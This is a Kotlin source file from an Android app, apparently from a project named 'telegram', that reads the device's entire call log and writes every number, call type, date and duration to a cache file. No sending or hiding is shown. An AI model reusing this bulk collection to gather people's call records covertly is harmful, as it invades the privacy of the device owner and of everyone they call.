package com.kashem.shaikh.telegram

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

object CallLogCollector {

    /**
     * Collects all call logs and writes them to a file.
     * Returns the file or null if failed (e.g., no permission).
     */
    fun collectCallLogs(context: Context): File? {
        val resolver: ContentResolver = context.contentResolver
        val uri = CallLog.Calls.CONTENT_URI
        val cursor: Cursor? = resolver.query(uri, null, null, null, null)

        if (cursor == null) {
            return null
        }

        val sb = StringBuilder()
        sb.appendLine("***** CALL LOGS *****\n")
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        sb.appendLine("Generated: ${dateFormat.format(Date())}\n")

        val numberColumn = cursor.getColumnIndex(CallLog.Calls.NUMBER)
        val typeColumn = cursor.getColumnIndex(CallLog.Calls.TYPE)
        val dateColumn = cursor.getColumnIndex(CallLog.Calls.DATE)
        val durationColumn = cursor.getColumnIndex(CallLog.Calls.DURATION)

        while (cursor.moveToNext()) {
            val number = cursor.getString(numberColumn)
            val date = dateFormat.format(Date(cursor.getLong(dateColumn)))
            val duration = cursor.getString(durationColumn)
            val type = when (cursor.getInt(typeColumn)) {
                CallLog.Calls.INCOMING_TYPE -> "Incoming"
                CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                CallLog.Calls.MISSED_TYPE -> "Missed"
                else -> "Unknown"
            }

            sb.appendLine("[$type] $date - $number")
            sb.appendLine("Duration: $duration seconds")
            sb.appendLine()
        }
        cursor.close()

        val file = File(context.cacheDir, "call_logs.txt")
        FileOutputStream(file).use {
            it.write(sb.toString().toByteArray())
        }
        return file
    }
}